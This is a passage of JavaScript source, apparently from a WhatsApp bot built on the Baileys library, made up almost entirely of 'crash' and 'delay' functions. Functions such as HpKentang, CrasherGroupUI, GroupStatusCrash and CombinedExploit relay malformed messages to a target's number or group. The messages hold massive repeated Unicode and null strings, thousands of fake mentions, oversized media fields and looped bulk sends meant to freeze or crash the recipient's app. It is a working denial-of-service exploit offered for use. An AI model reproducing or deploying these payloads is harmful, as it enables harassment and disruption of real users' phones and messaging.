                    title: "ោ៝".repeat(2000)
                  })
                }
              ]
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              ],
              stanzaId: conn.generateMessageTag(),
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            }
          }
        }
      }
    };

    await conn.relayMessage(target, msg2.message, {
      messageId: conn.generateMessageTag(),
      userJid: target
    });

    await sleep(100);

    const newsletterCrash = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "999999999@newsletter",
            newsletterName: "\u0000".repeat(30000) + "ោ៝".repeat(40000) + "꧔".repeat(30000),
            caption: "\uFFFF".repeat(50000) + "\u202E".repeat(50000),
            inviteExpiration: 253402300799999,
            inviteCode: "A".repeat(100000)
          }
        }
      }
    };

    await conn.relayMessage("666@newsletter", newsletterCrash.botInvokeMessage.message, {
      messageId: conn.generateMessageTag(),
      participant: { jid: target }
    });

    await sleep(50);

    const statusCrash = {
      viewOnceMessageV2: {
        message: {
            interactiveMessage: {
            contextInfo: {
              remoteJid: "status@broadcast",
              participant: "0@s.whatsapp.net",
              mentionedJid: Array.from({ length: 5000 }, () => 
                `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
              ),
              forwardingScore: 999999,
              isForwarded: true
            },
            body: {
              text: "\u0000".repeat(40000) + "ោ៝".repeat(40000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "\uFFFF".repeat(5000),
                    sections: Array.from({ length: 50 }, () => ({
                      title: "\u202E".repeat(1000),
                      rows: Array.from({ length: 50 }, () => ({
                        title: "\u0000".repeat(500),
                        id: "crash_" + Math.random()
                      }))
                    }))
                  })
                }
              ]
            }
          }
        }
      }
    };

    await conn.relayMessage("status@broadcast", statusCrash, {
      messageId: conn.generateMessageTag(),
      statusJidList: [target, "status@broadcast"]
    });

    await sleep(50);

    const whatsappJidFlood = {
      protocolMessage: {
        type: 255,
        key: {
          remoteJid: target,
          fromMe: false,
          id: conn.generateMessageTag(),
          participant: "0@s.whatsapp.net"
        },
        editedMessage: {
          conversation: "\u0000".repeat(30000) + "ោ៝".repeat(30000)
        }
      }
    };

    const jids = [
      target,
      "status@broadcast",
      "666@newsletter",
      "999999999@newsletter",
      "0@s.whatsapp.net",
      "1@s.whatsapp.net"
    ];

    for (const jid of jids) {
      await conn.relayMessage(jid, whatsappJidFlood, {
        messageId: conn.generateMessageTag()
      });
      await sleep(25);
    }

    await sleep(50);

    const newsletterReaction = {
      reactionMessage: {
        key: {
          remoteJid: "666@newsletter",
          fromMe: false,
          id: conn.generateMessageTag(),
          participant: target
        },
        text: "ោ៝".repeat(20000) + "\u0000".repeat(20000),
        groupingKey: Buffer.alloc(50000).toString('base64'),
        senderTimestampMs: Date.now().toString()
      }
    };

    await conn.relayMessage("666@newsletter", newsletterReaction, {
      messageId: conn.generateMessageTag()
    });

    const statusAttachment = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/" + "A".repeat(10000),
        mimetype: 'image/jpeg',
        fileLength: 999999999999,
        height: 99999,
        width: 99999,
        caption: "\u0000".repeat(30000) + "ោ៝".repeat(30000),
        viewOnce: true,
        thumbnail: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==".repeat(1000)
      }
    };

    await conn.relayMessage("status@broadcast", { message: statusAttachment }, {
      messageId: conn.generateMessageTag(),
      statusJidList: [target]
    });

  } catch (err) {}
}
async function HpKentang(conn, target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "setto ganteng bro",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "SETTO GANTENG\n" + "ꦾ".repeat(90000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: "{}"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        forwardingScore: 9999,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await conn.relayMessage(target, message, {
        participant: { jid: target }
    });
}
// Function Group 
async function ButtonCTTGroup(conn, targetgroup) {
  try {
    const crashMsg = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "𝐒𝐄𝐓𝐓𝐎 𝐍𝐄𝐕𝐄𝐑 𝐃𝐈𝐄¿?" + "ꦾ".repeat(50000),
            footerText: "Welcome To Hell🩸",
            headerType: 1,
            buttons: [
              {
                buttonId: "crash_",
                buttonText: {
                  displayText: "ꦽ".repeat(90000)
                },
                type: 1
              }
            ],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`
              ),
              participant: targetgroup,
              remoteJid: targetgroup,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "Always ArsyilCynxo",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };

    await conn.relayMessage(targetgroup, crashMsg, {
      userJid: targetgroup
    });

    console.log("ButtonCTT Crash Sent");
  } catch (err) {
    console.log(err);
  }
}

async function BulldozMamamAyangGrup(conn, targetgroup) {
  try {
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
    
    const stickerBuffer = Buffer.alloc(50 * 1024 * 1024);
    for (let i = 0; i < stickerBuffer.length; i++) {
      stickerBuffer[i] = Math.floor(Math.random() * 256);
    }
    
    const msg = await generateWAMessageFromContent(targetgroup, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: stickerBuffer.slice(0, 32),
            fileLength: stickerBuffer.length,
            height: 500000,
            width: 500000,
            mediaKey: stickerBuffer.slice(0, 32),
            fileEncSha256: stickerBuffer.slice(0, 32),
            directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
            mediaKeyTimestamp: Math.floor(Date.now() / 1000),
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 90000000000)}@s.whatsapp.net`
              ),
              participant: targetgroup,
              remoteJid: "status@broadcast",
              forwardingScore: 999999999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363424572003216@newsletter",
                newsletterName: "🩸 Setto Sex Crash",
                serverMessageId: 1
              },
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              }
            }
          }
        }
      }
    }, { userJid: targetgroup });

    await conn.relayMessage(targetgroup, msg.message, {
      messageId: msg.key.id,
      userJid: targetgroup
    });

    console.log("Sayang Udah Mamam Beyum? 🥰", targetgroup);
  } catch (err) {
  }
}

async function CrasherGroupUI(conn, targetgroup) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [targetgroup],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: targetgroup,
              },
            },
            body: {
              text: "🩸𝐒𝐄𝐓𝐓𝐎 𝐍𝐄𝐕𝐄𝐑 𝐃𝐈𝐄🗡" + "ꦽ".repeat(90000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(targetgroup, message, {
    });
  } catch (err) {
    console.log(err);
  }
}

async function BlankGroupMemeg(conn, targetgroup) {
  const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
  
  const mentionedList = Array.from({ length: 1900 }, () => 
    `1${Math.floor(Math.random() * 5000000000)}@s.whatsapp.net`
  );
  
  const msg = {
    groupInviteMessage: {
      groupJid: targetgroup,
      inviteCode: "974197419741",
      inviteExpiration: "99999999999999999999",
      groupName: "@ArsyilCynxo" + "ោ៝".repeat(15000),
      caption: "@ArsyilCynxo" + "ោ៝".repeat(15000),
      jpegThumbnail: null,
      contextInfo: {
        mentionedJid: mentionedList,
        participant: targetgroup.split('@')[0] + "@s.whatsapp.net",
        remoteJid: targetgroup,
        forwardingScore: 1,
        isForwarded: false
      }
    }
  };

  await conn.relayMessage(targetgroup, msg, {
    messageId: null,
    userJid: targetgroup
  });
  
  console.log("Blank Group Memeg Terkirim ke", targetgroup);
}

async function GroupStatusCrash(conn, targetgroup) {
  try {
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
    const crypto = require('crypto');
    
    const audioBuffer = Buffer.alloc(15 * 1024 * 1024);
    for (let i = 0; i < audioBuffer.length; i++) {
      audioBuffer[i] = Math.floor(Math.random() * 256);
    }
    
    const msg = {
      groupStatusMessage: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: crypto.randomBytes(32),
          fileLength: audioBuffer.length,
          seconds: 999999999,
          ptt: true,
          mediaKey: crypto.randomBytes(32),
          fileEncSha256: crypto.randomBytes(32),
          directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: Math.floor(Date.now() / 1000),
          waveform: Buffer.alloc(100, 0)
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 1900 }, () => 
            `1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`
          ),
          participant: targetgroup,
          remoteJid: "status@broadcast",
          forwardingScore: 999999999,
          isForwarded: true
        }
      }
    };

    await conn.relayMessage(targetgroup, msg, {
      userJid: targetgroup
    });

    console.log("Group Status Audio Crash Terkirim ke", targetgroup);
  } catch (err) {
    console.log(err);
  }
}

async function CrashGruB(targetgroup) {
  await conn.relayMessage(targetgroup, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "SETTO KILL YOU😂😹" + "ꦽ".repeat(90000),
      publisher: "Wa.me/stickerpack/null" + "𑇂𑆵𑆴𑆿".repeat(10000),
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🗿"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: ["🩲"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: ["😹"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: ["🎭"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: ["🤣"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: ["👻"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: ["🤑"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: ["😘"],
          accessibilityLabel: "Wa.me/stickerpack/@Bapaklo",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 900000000)}@s.whatsapp.net`),
      },
      packDescription: "\0".repeat(90000),
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}
//combo
async function ExcellCaroUselXStatusHydrated(target) {
  return new Promise(async (resolve) => {
    try {
      const interactiveContent = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "\u0000"
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                quotedMessage: {
                  conversation: "\u0000",
                  templateMessage: {
                    hydratedTemplate: {
                      hydratedContentText: "\u0000".repeat(1000000),
                      hydratedButtons: [
                        {
                          quickReplyButton: {
                            displayText: "",
                            id: ""
                          }
                        },
                        {
                          quickReplyButton: {
                            displayText: "",
                            id: ""
                          }
                        }
                      ]
                    }
                  }
                }
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "biz_trace",
                    buttonParamsJson: JSON.stringify({ action: "galaxy_message" })
                  },
                  {
                    name: "biz_trace",
                    buttonParamsJson: JSON.stringify({ action: "galaxy_message" })
                  },
                  {
                    name: "biz_trace",
                    buttonParamsJson: JSON.stringify({ action: "galaxy_message" })
                  }
                ]
              },
              header: {
                text: ""
              },
              footer: {
                text: ""
              },
              cards: {
                title: "biz_trace",
                actions: [
                  {
                    button: {
                      text: "",
                      id: "\u0000"
                    }
                  },
                  {
                    button: {
                      text: "",
                      id: "\u0000"
                    }
                  },
                  {
                    button: {
                      text: "",
                      id: "\u0000"
                    }
                  }
                ]
              }
            }
          }
        }
      }, {});

      let mark = 15;
      for (let i = 0; i < mark; i++) {
        let push = [];
        let buttt = [];

        for (let j = 0; j < 10; j++) {
          buttt.push({
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(1000), 
          });
        }

        for (let k = 0; k < 10500; k++) {
          push.push({
            "body": {
              "text": `\u0000\u0000\u0000\u0000\u0000`.repeat(1000), 
            },
            "footer": {
              "text": ""
            },
            "header": {
              "title": '\u0000\u0000\u0000\u0000',
              "hasMediaAttachment": true,
              "imageMessage": {
                "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                "mimetype": "image/jpeg",
                "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                "fileLength": "1",
                "height": 0,
                "width": 0,
                "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                "mediaKeyTimestamp": "1721344123",
                "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                "scanLengths": [1024, 1024, 1024, 1024],
                "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
              }
            },
            nativeFlowMessage: {
              buttons: buttt
            }
          });
        }

        const carousel = generateWAMessageFromContent(target, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: '\u0000\u0000\u0000\u0000'.repeat(1000), 
                },
                footer: {
                  text: ""
                },
                header: {
                  hasMediaAttachment: false
                },
                carouselMessage: {
                  cards: push
                }
              }
            }
          }
        }, {});

        const result1 = await setto.relayMessage(target, interactiveContent.message, {
          messageId: interactiveContent.key.id,
          format: 10,
          participant: { jid: target }
        });

        await new Promise(resolve => setTimeout(resolve, 500));

        const result2 = await setto.relayMessage(target, carousel.message, {
          messageId: carousel.key.id,
          format: 10,
          participant: { jid: target }
        }); 

        console.log(`Pesan ${i+1}):`, { result1, result2 });
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      setTimeout(() => resolve(), 2000);
    } catch (err) {
      console.error("xxxx:", err);
      resolve();
    }
  });
}
async function CombinedExploit(target) {
    const mentions1 = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => 
            "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net"
        )
    ];
    const extendedMsg = {
        extendedTextMessage: {
            text: "mexxtzzy ¿?",
            locationMessage: {
                degressLatitude: 617267,
                degressLongitude: -6172677,
                isLive: true,
                accuracyInMetters: 100,
                jpegThumbnail: null,
            },
            contextInfo: {
                forwardingScore: 9471,
                isForwarded: true,
                mentionedJid: mentions1,
                participant: target,
                stanzaId: target,
                entryPointConversionSource: "notification",
                remoteJid: target,
            },
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 3,
            },
        },
    };
    
    await conn.relayMessage(target, {
        groupStatusMessageV2: {
            message: extendedMsg
        }
    }, {
        participant: { jid: target }
    });

    for(let z = 0; z < 75; z++) {
        let msg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "\u0000".repeat(200),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx","landmark_area":"X","address":"Mxc","tower_number":"Mxc","city":"chindo","name":"Cy4","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"D | ${"\u0000".repeat(900000)}"}}`,
                    version: 3
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }, 
            }
        }, {});
  
        await conn.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: msg.key.id, 
            participant: { jid: target } 
        });
    }
}
async function SettoDelayDevice(target) {
let cards = [];
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

let Sky = JSON.stringify({
status: true,
criador: "VerloadXx",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebsocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

for (let r = 0; r < 1000; r++) {
cards.push({
body: { text: "" },
header: {
title: "",
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "payment_info",
buttonParamsJson: "{}"
}
]
}
});
}

let msg1 = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
interactiveMessage: {
body: { text: "" },
footer: { text: "\0" },
carouselMessage: { cards },
contextInfo: {
participant: "0@s.whatsapp.net",
quotedMessage: {},
remoteJid: "@s.whatsapp.net"
}
}
}
}
},
{}
);

await conn.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

const comboPayload = JSON.stringify([JSON.parse(Sky), JSON.parse(venomModsData)]);

let msg2 = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
header: { 
title: "", hasMediaAttachment: false 
},
body: { 
text: "\u0000".repeat(77000) 
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
buttons: [
{ 
name: "single_select", 
buttonParamsJson: comboPayload + "\u0005".repeat(1000), 
},
{ 
name: "wa_payment_transaction_details", 
